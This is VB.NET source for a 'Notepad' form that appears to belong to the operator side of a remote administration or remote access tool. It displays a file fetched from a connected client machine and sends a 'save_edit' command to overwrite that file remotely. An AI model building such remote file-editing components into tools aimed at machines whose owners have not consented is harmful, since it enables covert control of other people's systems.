﻿Public Class Notepad
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String
    Public pathFile As String

    Dim Rich As Boolean = True
    Private Sub Notepad_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Icon = store_0.icons_0("window")
        RichTextBox1.ContextMenuStrip = store_0.ContextMenu1
        Dim title As String = String.Format(Text & " - Remote Address & Port: {0} Client Name: {1} File path: {2}", Client_remote_Address, Name_Client, pathFile)
        Text = title
    End Sub
    Sub Client_data(ByVal data As String)
        RichTextBox1.Text = data
        Rich = False
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        Form1.s.Send(handle_Number_Client, "save_edit" + Form1.s.SplitData + pathFile + Form1.s.SplitData + RichTextBox1.Text)
        Me.Close()
    End Sub

    Private Sub RichTextBox1_TextChanged(sender As Object, e As EventArgs) Handles RichTextBox1.TextChanged
        If Rich = False Then
            If Button1.Enabled = False Then Button1.Enabled = True
        End If

    End Sub
End Class





